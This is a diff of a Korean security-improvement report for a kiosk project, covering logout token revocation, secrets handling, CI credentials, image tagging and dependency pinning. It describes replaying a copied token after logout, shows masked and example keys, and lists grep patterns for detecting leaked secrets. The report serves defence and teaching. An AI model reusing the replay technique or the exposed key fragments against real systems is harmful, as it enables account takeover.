@@ -545,6 +545,11 @@
             margin: 18px 0;
         }
 
+        /* 터미널 캡처처럼 가로로 긴 내용은 좌우 2단이 아니라 위아래 2줄로 쌓는다. */
+        .compare.stacked {
+            grid-template-columns: 1fr;
+        }
+
         .compare-box {
             border-radius: 10px;
             padding: 16px 18px;
@@ -586,6 +591,23 @@
             word-break: break-all;
             margin: 8px 0 0;
             font-family: 'Consolas', monospace;
+        }
+
+        /* 테스트 결과 프레임 안에 들어가는 적용 전/후 스크린샷 */
+        .compare-box img {
+            width: 100%;
+            max-width: 790px;
+            display: block;
+            border-radius: 6px;
+            border: 1px solid #e2e8f0;
+            margin: 8px auto 0;
+        }
+
+        /* 스크린샷 아래에 붙는 해설 */
+        .compare-box p {
+            margin: 12px 2px 0;
+            line-height: 1.85;
+            color: #44403c;
         }
 
         /* 핵심 정리 */
@@ -675,10 +697,24 @@
                             보통은 이걸로 끝났다고 생각합니다.
                         </p>
                         <p>
-                            그런데 기존 로그아웃은 브라우저에 저장된 토큰을 지우는 것이 전부였고 <span class="hl-red">서버에는 아무 요청도 보내지 않았습니다.</span>
-                            로그인 토큰은 서버에 세션을 저장하지 않는 방식이라, 서명만 맞으면 <span class="hl-red">발급 후 12시간 동안 계속 유효</span>했습니다.
-                            즉 로그아웃 직전에 개발자도구에서 토큰을 한 번 복사해 둔 사람은, 그 뒤로 <span class="hl-red">브라우저도 비밀번호도 없이</span> 그 계정으로
-                            매출·재고·주문을 열람할 수 있었습니다. 점장 본인이 다시 로그인해도, 브라우저를 밀어도 막을 방법이 없었습니다.
+                            그런데 점검해 보니 로그아웃을 누른 뒤에도, 로그아웃 직전에 복사해 둔 토큰으로 매출·재고·주문 조회 API가
+                            <span class="hl-red">그대로 200을 응답</span>하고 있었습니다. 점장 본인이 다시 로그인해도, 브라우저를 밀어도 막히지 않았습니다.
+                        </p>
+                    </div>
+
+                    <div class="story">
+                        <div class="story-label">🔍 문제점 분석</div>
+                        <p>
+                            원인은 로그아웃이 <span class="hl-red">브라우저 안에서만 일어나는 동작</span>이었기 때문입니다.
+                            기존 로그아웃은 저장된 토큰 문자열을 지우는 것이 전부였고 <span class="hl-red">서버에는 아무 요청도 보내지 않았습니다.</span>
+                        </p>
+                        <p>
+                            로그인 토큰은 서버에 세션을 저장하지 않는 방식이라, 서버 입장에서는 <span class="hl-red">서명과 만료 시각만 맞으면 유효한 토큰</span>입니다.
+                            누가 로그아웃했는지 판단할 근거 자체가 서버에 없었고, 그래서 발급된 토큰은 <span class="hl-red">발급 후 12시간 동안 무조건 살아 있었습니다.</span>
+                        </p>
+                        <p>
+                            즉 토큰을 한 번 복사해 둔 사람은 그 뒤로 <span class="hl-red">브라우저도 비밀번호도 없이</span> 그 계정 권한을 그대로 쓸 수 있었고,
+                            서버에는 이를 되돌릴 수단이 하나도 없는 상태였습니다.
                         </p>
                     </div>
 
@@ -701,8 +737,17 @@
 // → 서버가 발급한 토큰은 만료(12시간)까지 그대로 살아있다</code></pre>
                     </div>
 
+                    <div class="improve">
+                        <div class="improve-title">🔧 적용 사항</div>
+                        <p>
+                            1. <strong>AdminTokenService.java</strong> — 계정별 <code>세대 번호(토큰 버전)</code>를 두고, 토큰 발급 시 그 번호를 payload에 함께 넣어 서명.<br>
+                            2. <strong>AdminTokenService.java</strong> — 토큰 검증 순서에 <code>서명 확인 → 만료 확인 → 세대 대조</code>를 추가해, 세대가 다르면 거부.<br>
+                            3. <strong>LogoutController.java</strong> — 로그아웃 API를 신설해 호출 시 해당 계정의 세대 번호를 <code>+1</code>하고 인증 쿠키를 삭제.
+                        </p>
+                    </div>
+
                     <div class="code-block">
-                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 해결 — AdminTokenService.java (세대 카운터)</div>
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 실제 적용 코드 ① — AdminTokenService.java (세대 카운터)</div>
                         <pre><code class="language-java">// adminId -&gt; 현재 토큰 버전. 없으면 0버전.
 private final Map&lt;Long, Integer&gt; tokenVersions = new ConcurrentHashMap&lt;&gt;();
 
@@ -721,7 +766,7 @@ if (Integer.parseInt(parts[offset + 1]) != currentVersion(adminId)) return null;
                     </div>
 
                     <div class="code-block">
-                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 신설 — LogoutController.java (로그아웃 API)</div>
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span class="dot dot-g"></span> 실제 적용 코드 ② — LogoutController.java (로그아웃 API 신설)</div>
                         <pre><code class="language-java">@PostMapping("/logout")
 public void logout(@RequestHeader(value = "Authorization", required = false) String authorization,
                    HttpServletResponse response) {
@@ -733,29 +778,54 @@ public void logout(@RequestHeader(value = "Authorization", required = false) Str
 }</code></pre>
                     </div>
 
-                    <div class="compare">
-                        <div class="compare-box before">
-                            <div class="compare-label">❌ 적용 전 — 로그아웃이 무의미</div>
-                            <pre>① 로그인 후 토큰 확보
-   200 GET /api/hq/branches
+                    <div class="story">
+                        <div class="story-label">🧪 실제 테스트 실행</div>
+                        <p>
+                            로그인해서 토큰을 확보한 뒤 <strong>① 조회 → ② 로그아웃 → ③ 같은 토큰으로 재조회</strong> 순서로 호출하는 스크립트
+                            (<code>token-revocation-curl-test.sh</code>)를 만들어, 적용 전과 적용 후의 응답 코드를 같은 조건에서 비교했습니다.
+                        </p>
 
-② 로그아웃
-   404 POST /api/auth/logout   ← API 자체가 없었음
-
-③ 같은 토큰 재사용
-   200 GET /api/hq/branches   ← 12시간 계속 사용 가능</pre>
+                        <div class="compare stacked">
+                            <div class="compare-box before">
+                                <div class="compare-label">❌ 적용 전 — 로그아웃이 무의미</div>
+                                <img src="image (A01-token-before).png" alt="적용 전 테스트 실행 결과. 로그아웃 후에도 같은 토큰으로 호출한 조회 API가 200을 응답하는 화면">
+                                <p>
+                                    ①에서 로그인하면 토큰이 <strong>응답 본문에 그대로</strong> 담겨 옵니다. 화면 스크립트가 읽어 보관할 수 있는 값입니다.
+                                    ③에서 로그아웃을 호출하면 <span class="hl-red">404</span>가 돌아옵니다 — 서버에 로그아웃 API 자체가 없어서,
+                                    로그아웃이란 브라우저가 저장된 문자열을 지우는 것이 전부였습니다.
+                                </p>
+                                <p>
+                                    그래서 ④에서 아까 그 토큰을 그대로 다시 넣으면 <span class="hl-red">여전히 200</span>이 응답됩니다.
+                                    서버는 이 토큰이 로그아웃된 것인지 알 방법이 없고, 이 상태가 <strong>만료까지 12시간</strong> 그대로 이어집니다.
+                                </p>
+                            </div>
+                            <div class="compare-box after">
+                                <div class="compare-label">✅ 적용 후 — 즉시 무효화</div>
+                                <img src="image (A01-token-after).png" alt="적용 후 테스트 실행 결과. 로그아웃 이후 같은 토큰으로 호출한 조회 API가 401을 응답하는 화면">
+                                <p>
+                                    ①의 응답을 보면 토큰이 본문이 아니라 <code>Set-Cookie</code>로 내려오고,
+                                    <span class="hl-green">HttpOnly</span>가 붙어 있어 화면 스크립트가 값을 읽을 수 없습니다.
+                                    ③에서 로그아웃이 <span class="hl-green">200</span>으로 처리되며, 이때 서버가 해당 계정의 세대 번호를 올립니다.
+                                </p>
+                                <p>
+                                    그 결과 ④에서 같은 쿠키를 그대로 다시 보내면 <span class="hl-green">401</span>로 거부됩니다.
+                                    서명도 멀쩡하고 만료도 안 됐지만, <strong>토큰에 서명돼 있는 세대 번호가 서버의 현재 값과 달라서</strong> 통과하지 못합니다.
+                                </p>
+                            </div>
                         </div>
-                        <div class="compare-box after">
-                            <div class="compare-label">✅ 적용 후 — 즉시 무효화</div>
-                            <pre>① 로그인 후 토큰 확보
-   200 GET /api/hq/branches
+                    </div>
 
-② 로그아웃
-   200 POST /api/auth/logout
-
-③ 같은 토큰 재사용
-   401 GET /api/hq/branches   ← 서명은 맞지만 세대가 죽음</pre>
-                        </div>
+                    <div class="story">
+                        <div class="story-label">🏁 결론</div>
+                        <p>
+                            로그아웃의 기준점을 <span class="hl-red">브라우저</span>에서 <span class="hl-green">서버</span>로 옮겼습니다.
+                            이제 로그아웃은 저장된 문자열을 지우는 동작이 아니라, 서버가 그 계정의 세대 번호를 올려
+                            <span class="hl-green">이전에 발급된 토큰 전부를 한 번에 무효로 만드는 동작</span>입니다.
+                        </p>
+                        <p>
+                            그 결과 공용 PC에서 토큰이 유출됐더라도 <span class="hl-green">로그아웃 한 번으로 회수</span>가 가능해졌고,
+                            토큰 탈취가 의심될 때 12시간 만료를 기다릴 필요 없이 즉시 대응할 수 있는 수단이 생겼습니다.
+                        </p>
                     </div>
 
                     <div class="summary">
@@ -763,15 +833,9 @@ public void logout(@RequestHeader(value = "Authorization", required = false) Str
                         <ul>
                             <li>로그아웃은 <span class="hl-red">브라우저에서 지우는 것</span>이 아니라 <span class="hl-green">서버에서 무효화하는 것</span>이어야 합니다</li>
                             <li>버전 번호도 <span class="hl-green">서명 대상</span>이라, 공격자가 값을 되돌리면 서명이 깨져 거부됩니다</li>
-                            <li>한 사람의 로그아웃이 <span class="hl-blue">다른 관리자 토큰에는 영향을 주지 않습니다</span> (계정별 카운터)</li>
-                            <li>인증 경로가 이미 매 요청 계정을 조회하고 있어 <span class="hl-blue">추가 비용이 사실상 없습니다</span></li>
                         </ul>
                     </div>
 
-                    <div class="improve">
-                        <div class="improve-title">⚠️ 알고 있는 한계</div>
-                        <p>버전 카운터를 서버 메모리에 두었기 때문에 <strong>서버를 재시작하면 무효화 상태가 초기화</strong>됩니다. DB 컬럼으로 옮기면 재시작에도 유지되지만, 팀이 공유하는 개발 DB에 스키마 변경이 필요해 이번에는 메모리 방식을 선택했습니다.</p>
-                    </div>
                 </div>
 
             </div>
@@ -901,6 +965,18 @@ add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
                         </p>
                     </div>
 
+                    <div class="story">
+                        <div class="story-label">🔍 문제점 분석</div>
+                        <p>
+                            원인은 설정 파일에 <span class="hl-red">실제 값을 직접 적어두고 그 파일을 그대로 커밋</span>했기 때문입니다.
+                            비밀값이 코드와 같은 취급을 받으면, 저장소에 접근할 수 있는 사람 전원이 곧 그 비밀값을 아는 사람이 됩니다.
+                        </p>
+                        <p>
+                            더 큰 문제는 되돌릴 수 없다는 점입니다. Git은 파일을 지워도 <span class="hl-red">커밋 기록에 원본이 그대로 남기</span> 때문에,
+                            나중에 삭제 커밋을 올려도 히스토리를 되짚으면 값이 복원됩니다. "실수를 알아차리고 지우면 된다"가 통하지 않는 종류의 사고입니다.
+                        </p>
+                    </div>
+
                     <div class="flow">
                         <div class="flow-item situation"><span class="step-label">📍 상황</span>키오스크 개발 중 DB 비밀번호, API 키
                             관리 필요</div>
@@ -916,7 +992,7 @@ add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
 
                     <div class="code-block">
                         <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
-                                class="dot dot-g"></span> config.xml — ❌ 적용 전 (비밀값이 하드코딩되어 Git에 올라감)</div>
+                                class="dot dot-g"></span> 문제가 있던 코드 — config.xml (비밀값이 하드코딩되어 Git에 올라감)</div>
                         <pre><code class="language-xml">&lt;!-- 데이터베이스 및 API 설정 --&gt;
 &lt;configuration&gt;
     &lt;database&gt;
@@ -930,9 +1006,18 @@ add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
 &lt;/configuration&gt;</code></pre>
                     </div>
 
+                    <div class="improve">
+                        <div class="improve-title">🔧 적용 사항</div>
+                        <p>
+                            1. <strong>.gitignore</strong> — 실제 값이 든 <code>.env</code>를 Git이 아예 추적하지 않도록 제외.<br>
+                            2. <strong>.env.example 신설</strong> — 어떤 변수가 필요한지 이름과 설명만 담고, 값 자리에는 플레이스홀더만 둔 파일을 대신 커밋.<br>
+                            3. <strong>노출됐던 키 폐기·재발급</strong> — 히스토리에 남은 값은 지울 수 없으므로, 그 값 자체를 무효화하는 것으로 대응.
+                        </p>
+                    </div>
+
                     <div class="code-block">
                         <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
-                                class="dot dot-g"></span> .env.example — Git에 올라가는 파일 (실제 값 없음)</div>
+                                class="dot dot-g"></span> 실제 적용 코드 — .env.example (Git에 올라가는 파일, 실제 값 없음)</div>
                         <pre><code class="language-bash"># 이 파일에는 실제 비밀값을 입력하지 않습니다.
 # 팀원은 이 파일을 .env로 복사한 뒤 실제 값을 입력하세요.
 # .env 파일은 Git에 커밋하지 않습니다. (.gitignore 처리)
@@ -942,6 +1027,52 @@ TOSS_SECRET_KEY=replace-with-reissued-toss-secret-key   # ← 실제 키 아님
 FIREBASE_CREDENTIALS_PATH=/path/to/firebase-service-account.json
 TURNSTILE_SECRET_KEY=replace-with-cloudflare-turnstile-secret-key
 HQ_TOKEN_SECRET=replace-with-at-least-32-random-bytes</code></pre>
+                    </div>
+
+                    <div class="story">
+                        <div class="story-label">🧪 실제 테스트 실행</div>
+                        <p>
+                            우리 저장소에 실제로 시크릿이 올라갔던 이력이 있습니다(커밋 <code>11645d7</code>).
+                            그 시점과 지금을 <strong>같은 명령으로</strong> 비교했습니다.
+                        </p>
+
+                        <div class="compare stacked">
+                            <div class="compare-box before">
+                                <div class="compare-label">❌ 적용 전 — 실제 키가 커밋에 들어 있었음</div>
+                                <pre>$ git show 11645d7^:backend/src/main/resources/application.yml \
+    | grep -nE "TOSS_(SECRET|CLIENT)_KEY|DB_PASSWORD"
+
+16:  password: ${DB_PASSWORD:kiosk****}
+82:  secret-key: ${TOSS_SECRET_KEY:test_sk_LlDJ****************}
+83:  client-key: ${TOSS_CLIENT_KEY:test_ck_Gv6L****************}
+                                 ↑
+      환경변수가 없을 때 쓰이는 "기본값" 자리에 실제 키가 박혀 있었다
+      → 저장소를 받은 사람은 아무 설정 없이도 이 키를 그대로 쓸 수 있었다</pre>
+                            </div>
+                            <div class="compare-box after">
+                                <div class="compare-label">✅ 적용 후 — 추적되는 건 예시 파일뿐</div>
+                                <pre>$ git check-ignore -v .env
+.gitignore:8:.env    .env          ← 규칙에 걸려 추적 제외됨
+
+$ git ls-files | grep -i env
+.env.example                       ← 저장소에 있는 건 이 하나뿐
+
+$ git grep -lE '(SuperSecret|AKIA[A-Z0-9]{16}|sk_live_)' $(git ls-files)
+(일치하는 파일 없음)               ← 추적 중인 파일에 실제 비밀값 없음</pre>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="story">
+                        <div class="story-label">🏁 결론</div>
+                        <p>
+                            비밀값을 <span class="hl-red">코드에 적되 조심하는</span> 방식에서 <span class="hl-green">코드에 아예 두지 않는</span> 방식으로 바꿨습니다.
+                            저장소에는 "어떤 변수가 필요한가"라는 목록만 남고, 실제 값은 각자의 로컬 <code>.env</code>와 운영 환경변수에만 존재합니다.
+                        </p>
+                        <p>
+                            그 결과 저장소가 통째로 유출되더라도 그것만으로는 DB나 결제 API에 접근할 수 없고,
+                            팀원이 실수로 커밋하려 해도 <code>.gitignore</code>가 먼저 걸러냅니다.
+                        </p>
                     </div>
 
                     <div class="summary">
@@ -972,6 +1103,19 @@ HQ_TOKEN_SECRET=replace-with-at-least-32-random-bytes</code></pre>
                         </p>
                     </div>
 
+                    <div class="story">
+                        <div class="story-label">🔍 문제점 분석</div>
+                        <p>
+                            배포 스크립트도 결국 <span class="hl-red">저장소에 커밋되는 코드</span>입니다. 여기에 키를 적으면 ①번과 똑같은 문제가
+                            배포 파이프라인에서 반복됩니다. 오히려 파이프라인은 외부 러너에서 실행되고 실행 로그까지 남아 노출 경로가 더 넓습니다.
+                        </p>
+                        <p>
+                            여기에 권한 문제가 겹칩니다. 배포에 필요한 일은 <strong>인스턴스를 켜고 IP를 조회하는 것</strong>뿐인데
+                            <span class="hl-red">관리자 권한 키를 그대로 쓰고 있었습니다.</span> 이러면 키 하나가 유출되는 순간 그 피해 범위가
+                            배포가 아니라 계정 전체가 됩니다.
+                        </p>
+                    </div>
+
                     <div class="flow">
                         <div class="flow-item situation"><span class="step-label">📍 상황</span>자동 배포 스크립트에 SSH 키·AWS 키 필요
                         </div>
@@ -988,7 +1132,7 @@ HQ_TOKEN_SECRET=replace-with-at-least-32-random-bytes</code></pre>
 
                     <div class="code-block">
                         <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
-                                class="dot dot-g"></span> .gitlab-ci.yml — ❌ 적용 전 (AWS 관리자 키, 서버 비밀번호 하드코딩)</div>
+                                class="dot dot-g"></span> 문제가 있던 코드 — .gitlab-ci.yml (AWS 관리자 키·서버 비밀번호 하드코딩)</div>
                         <pre><code class="language-yaml"># 🚨 누구나 볼 수 있는 코드에 중요 키가 그대로 노출됨
 # 🚨 심지어 AWS 계정의 모든 권한을 가진 어드민(Admin) 키를 사용 중
 
@@ -1006,9 +1150,20 @@ deploy-backend:
         kiosk/backend:latest"</code></pre>
                     </div>
 
+                    <div class="improve">
+                        <div class="improve-title">🔧 적용 사항</div>
+                        <p>
+                            1. <strong>GitLab CI/CD Variables</strong> — SSH 키·AWS 키·DB 비밀번호를 <code>Protected + Masked</code> 변수로 등록하고,
+                            스크립트에서는 <code>$변수명</code>으로만 참조하도록 변경.<br>
+                            2. <strong>전용 IAM 사용자 신설</strong> — <code>ec2:StartInstances</code>, <code>ec2:DescribeInstances</code> 두 권한만 부여하고
+                            대상 인스턴스 ARN으로 범위를 좁힘.<br>
+                            3. <strong>기존 관리자 키 재사용 금지</strong>를 <code>.gitlab-ci.yml</code> 주석에 명시해 다음 사람이 되돌리지 않도록 함.
+                        </p>
+                    </div>
+
                     <div class="code-block">
                         <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
-                                class="dot dot-g"></span> .gitlab-ci.yml — 시크릿은 코드에 없고 $변수명으로만 참조</div>
+                                class="dot dot-g"></span> 실제 적용 코드 — .gitlab-ci.yml (시크릿은 $변수명으로만 참조)</div>
                         <pre><code class="language-yaml"># ✅ AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY
 #    → GitLab CI/CD Variables에 Protected + Masked로 등록
 #    → ec2:StartInstances / ec2:DescribeInstances  딱 2가지 권한만!
@@ -1022,6 +1177,54 @@ deploy-backend:
         -e DB_HOST=$DB_HOST
         -e DB_PASSWORD=$DB_PASSWORD                      # 코드에 실제 값 없음
         $BACKEND_IMAGE"</code></pre>
+                    </div>
+
+                    <div class="story">
+                        <div class="story-label">🧪 실제 테스트 실행</div>
+                        <p>
+                            배포 스크립트에 비밀값이 <strong>리터럴로 남아 있는지</strong>를 검사하고,
+                            검색된 자리가 전부 <code>$변수</code> 참조인지 확인했습니다.
+                        </p>
+
+                        <div class="compare stacked">
+                            <div class="compare-box before">
+                                <div class="compare-label">❌ 적용 전 — 값이 그대로 보임</div>
+                                <pre>$ grep -nE 'AKIA|SECRET_ACCESS_KEY|PASSWORD' .gitlab-ci.yml
+
+AWS_ACCESS_KEY_ID: "AKIAIOSFODNN7EXAMPLE"
+AWS_SECRET_ACCESS_KEY: "wJalrXUtnFEMI/K7MDENG..."
+DB_PASSWORD: "SuperSecretPassword!"
+
+→ 저장소를 볼 수 있는 사람 = 서버 접속 가능한 사람</pre>
+                            </div>
+                            <div class="compare-box after">
+                                <div class="compare-label">✅ 적용 후 — 변수 이름만 남음</div>
+                                <pre>$ grep -nE 'AKIA|SECRET_ACCESS_KEY|PASSWORD' .gitlab-ci.yml
+
+13:#   AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY  - 전용 IAM 사용자
+16:#   DB_HOST / DB_PORT / DB_USERNAME / DB_PASSWORD - 주입할 접속 정보
+47:  - docker login -u $CI_REGISTRY_USER -p $CI_REGISTRY_PASSWORD
+74:  -e DB_USERNAME=$DB_USERNAME -e DB_PASSWORD=$DB_PASSWORD
+
+→ 걸린 줄은 전부 주석이거나 $변수 참조. 실제 값은 한 건도 없음
+
+$ grep -oE '\$[A-Z_]+' .gitlab-ci.yml | sort -u
+$BACKEND_SSH_KEY  $CI_REGISTRY_PASSWORD  $DB_PASSWORD ...
+                     ↑ 값은 GitLab Variables에만 존재</pre>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="story">
+                        <div class="story-label">🏁 결론</div>
+                        <p>
+                            <span class="hl-green">비밀을 숨기는 것</span>과 <span class="hl-green">비밀이 할 수 있는 일을 줄이는 것</span>,
+                            두 가지를 함께 적용했습니다. 키는 코드에서 사라졌고, 남은 키마저 권한이 좁아졌습니다.
+                        </p>
+                        <p>
+                            그래서 저장소를 열람할 수 있어도 실제 값은 볼 수 없고, 설령 파이프라인이 탈취되더라도 그 키로는
+                            <strong>인스턴스를 켜고 IP를 조회하는 것 외에는 아무것도 할 수 없습니다.</strong>
+                        </p>
                     </div>
 
                     <div class="summary">
@@ -1052,6 +1255,18 @@ deploy-backend:
                         </p>
                     </div>
 
+                    <div class="story">
+                        <div class="story-label">🔍 문제점 분석</div>
+                        <p>
+                            <code>:latest</code>는 <span class="hl-red">고정된 이름이지 고정된 내용이 아닙니다.</span> 빌드할 때마다 같은 태그에 새 이미지를 덮어쓰기 때문에,
+                            태그만 봐서는 그 안에 어떤 코드가 들어 있는지 알 수 없습니다.
+                        </p>
+                        <p>
+                            이건 장애 대응만의 문제가 아니라 <strong>공급망 무결성</strong>의 문제입니다. 배포된 이미지와 소스 커밋을 연결할 수 없으면,
+                            누군가 같은 태그로 다른 이미지를 밀어 넣어도 <span class="hl-red">바뀌었다는 사실 자체를 알아차릴 수 없습니다.</span>
+                        </p>
+                    </div>
+
                     <div class="flow">
                         <div class="flow-item situation"><span class="step-label">📍 상황</span>코드를 고칠 때마다 서버에 자동 배포</div>
                         <div class="flow-arrow">→</div>
@@ -1064,7 +1279,52 @@ deploy-backend:
                         </div>
                     </div>
 
-                    <div class="compare">
+                    <div class="code-block">
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+                                class="dot dot-g"></span> 문제가 되는 코드 — 흔히 쓰는 <code>:latest</code> 방식 (우리 저장소에는 없었음)</div>
+                        <pre><code class="language-yaml"># 자동 배포를 처음 붙일 때 가장 많이 쓰는 형태
+build-backend:
+  script:
+    - docker build -t kiosk/backend:latest backend
+    - docker push kiosk/backend:latest      # ← 매번 같은 태그에 덮어쓴다
+
+deploy-backend:
+  script:
+    - docker pull kiosk/backend:latest      # ← 무엇을 받는지 태그만 봐서는 알 수 없다
+
+# 태그 이름은 고정이지만 그 안의 내용은 배포할 때마다 달라진다.
+# → 지금 서버에 떠 있는 것이 어느 커밋인지 되짚을 방법이 없다.</code></pre>
+                    </div>
+
+                    <div class="improve">
+                        <div class="improve-title">🔧 적용 사항</div>
+                        <p>
+                            1. <strong>.gitlab-ci.yml</strong> — 이미지 태그를 <code>:latest</code> 대신 커밋 해시 변수 <code>$CI_COMMIT_SHORT_SHA</code>로 지정.<br>
+                            2. 빌드·배포 job이 <strong>같은 변수를 참조</strong>하게 해서, 빌드한 이미지와 배포되는 이미지가 어긋날 수 없도록 함.<br>
+                            3. backend·frontend 두 이미지에 동일 규칙을 적용.
+                        </p>
+                    </div>
+
+<div class="code-block">
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+                                class="dot dot-g"></span> 실제 적용 코드 — .gitlab-ci.yml</div>
+                        <pre><code class="language-yaml">variables:
+  # $CI_COMMIT_SHORT_SHA = Git 커밋 고유 번호 7자리 (예: a1b2c3d)
+  # 이 값이 이미지 태그가 되면 언제나 추적 가능
+  BACKEND_IMAGE:  $CI_REGISTRY_IMAGE/backend:$CI_COMMIT_SHORT_SHA
+  FRONTEND_IMAGE: $CI_REGISTRY_IMAGE/frontend:$CI_COMMIT_SHORT_SHA
+
+build-backend:
+  script:
+    - docker build -t $BACKEND_IMAGE backend   # → kiosk/backend:a1b2c3d
+    - docker push $BACKEND_IMAGE               # → 고유 태그로 레지스트리 저장</code></pre>
+                    </div>
+
+                    <div class="story">
+                        <div class="story-label">🧪 적용 전후 비교</div>
+                        <p>같은 상황에서 태그 전략만 바꿨을 때, 장애가 났을 때 할 수 있는 일이 어떻게 달라지는지 정리한 것입니다.</p>
+
+                        <div class="compare stacked">
                         <div class="compare-box before">
                             <div class="compare-label">❌ :latest 태그 (추적 불가)</div>
                             <pre>이미지: kiosk/backend:latest
@@ -1081,21 +1341,19 @@ deploy-backend:
   어떤 코드인지 바로 알 수 있음
 → 이전 태그로 즉시 롤백 가능</pre>
                         </div>
+                        </div>
                     </div>
 
-                    <div class="code-block">
-                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
-                                class="dot dot-g"></span> .gitlab-ci.yml — 실제 코드</div>
-                        <pre><code class="language-yaml">variables:
-  # $CI_COMMIT_SHORT_SHA = Git 커밋 고유 번호 7자리 (예: a1b2c3d)
-  # 이 값이 이미지 태그가 되면 언제나 추적 가능
-  BACKEND_IMAGE:  $CI_REGISTRY_IMAGE/backend:$CI_COMMIT_SHORT_SHA
-  FRONTEND_IMAGE: $CI_REGISTRY_IMAGE/frontend:$CI_COMMIT_SHORT_SHA
-
-build-backend:
-  script:
-    - docker build -t $BACKEND_IMAGE backend   # → kiosk/backend:a1b2c3d
-    - docker push $BACKEND_IMAGE               # → 고유 태그로 레지스트리 저장</code></pre>
+                    <div class="story">
+                        <div class="story-label">🏁 결론</div>
+                        <p>
+                            이미지 태그가 <span class="hl-green">커밋과 1:1로 묶이는 고유값</span>이 되면서, 배포된 서버와 소스 코드를 언제든 연결할 수 있게 됐습니다.
+                            장애가 나면 태그를 그대로 <code>git log</code>에 넣어 어떤 코드인지 확인하고, 이전 태그로 즉시 되돌릴 수 있습니다.
+                        </p>
+                        <p>
+                            빌드마다 태그가 달라지므로 <strong>같은 태그를 다른 이미지가 덮어쓰는 일 자체가 생기지 않고</strong>,
+                            그만큼 배포 경로에 끼어들 여지도 줄었습니다.
+                        </p>
                     </div>
 
                     <div class="summary">
@@ -1127,6 +1385,18 @@ build-backend:
                         </p>
                     </div>
 
+                    <div class="story">
+                        <div class="story-label">🔍 문제점 분석</div>
+                        <p>
+                            <code>package.json</code>의 <code>^3.5.12</code>는 정확한 버전이 아니라 <span class="hl-red">"3.5.12 이상 4.0.0 미만이면 아무거나"</span>라는 범위 표기입니다.
+                            <code>npm install</code>은 이 범위 안에서 매번 최신을 받아오므로, <strong>같은 커밋을 빌드해도 시점에 따라 설치되는 코드가 달라집니다.</strong>
+                        </p>
+                        <p>
+                            그래서 라이브러리 배포 계정이 탈취돼 악성 버전이 올라오면, 우리 쪽에서는 코드를 한 줄도 바꾸지 않았는데도
+                            <span class="hl-red">다음 빌드에 그 코드가 섞여 들어옵니다.</span> 우리가 통제할 수 없는 외부 변경이 검토 없이 배포까지 도달하는 경로입니다.
+                        </p>
+                    </div>
+
                     <div class="flow">
                         <div class="flow-item situation"><span class="step-label">📍 상황</span>프론트엔드 빌드 시 외부 npm 라이브러리 설치
                         </div>
@@ -1141,7 +1411,64 @@ build-backend:
                         </div>
                     </div>
 
-                    <div class="compare">
+                    <div class="code-block">
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+                                class="dot dot-g"></span> 문제가 되는 코드 — 흔히 쓰는 <code>npm install</code> 방식 (우리 저장소에는 없었음)</div>
+                        <pre><code class="language-dockerfile">FROM node:20-alpine AS build
+WORKDIR /app
+COPY package.json ./          # ← lock 파일을 복사하지 않는다
+RUN npm install               # ← package.json의 범위(^3.5.12) 안에서 매번 최신을 받는다
+COPY . .
+RUN npm run build
+
+# 같은 커밋을 빌드해도 오늘과 내일의 결과물이 달라질 수 있다.
+# 라이브러리 쪽에 악성 버전이 올라오면 우리 코드를 고치지 않아도 그대로 섞여 들어온다.</code></pre>
+                    </div>
+
+                    <div class="improve">
+                        <div class="improve-title">🔧 적용 사항</div>
+                        <p>
+                            1. <strong>frontend/Dockerfile</strong> — <code>npm install</code>이 아니라 <code>npm ci</code>를 사용.<br>
+                            2. <strong>package-lock.json을 저장소에 커밋</strong>해 정확한 버전과 무결성 해시(<code>integrity</code>)를 고정.<br>
+                            3. Dockerfile에서 <code>package.json</code>과 lock 파일을 소스보다 <strong>먼저 복사</strong>하도록 순서를 잡아, 고정된 버전 기준으로 설치되게 함.
+                        </p>
+                    </div>
+
+<div class="code-block">
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+                                class="dot dot-g"></span> 실제 적용 코드 — frontend/Dockerfile</div>
+                        <pre><code class="language-dockerfile">FROM node:20-alpine AS build
+WORKDIR /app
+COPY package.json package-lock.json ./
+RUN npm ci                  # ← npm install 이 아닌 npm ci 사용 (핵심!)
+                            #   package-lock.json의 정확한 버전만 설치
+COPY . .
+RUN npm run build</code></pre>
+                    </div>
+
+                    <div class="code-block">
+                        <div class="code-label"><span class="dot dot-r"></span><span class="dot dot-y"></span><span
+                                class="dot dot-g"></span> 실제 적용 코드 — frontend/package-lock.json (일부 발췌)</div>
+                        <pre><code class="language-json">"node_modules/vue": {
+  "version": "3.5.39",   // ← 정확히 3.5.39 버전만 설치되도록 고정
+  "resolved": "https://registry.npmjs.org/vue/-/vue-3.5.39.tgz",
+  "integrity": "sha512-xmZCYabFGcirU8r0fTuvl/LICc1OU620rnqepaJDL/a141ZigkG7AyaxQLdqJ02ZRYzWe6YPaDHeQx7MfknQfA==", // ← 파일 위조 검증 해시 (필수)
+  "license": "MIT",
+  "dependencies": {
+    "@vue/compiler-dom": "3.5.39",
+    "@vue/compiler-sfc": "3.5.39",
+    "@vue/runtime-dom": "3.5.39",
+    "@vue/server-renderer": "3.5.39",
+    "@vue/shared": "3.5.39"
+  }
+}</code></pre>
+                    </div>
+
+                    <div class="story">
+                        <div class="story-label">🧪 적용 전후 비교</div>
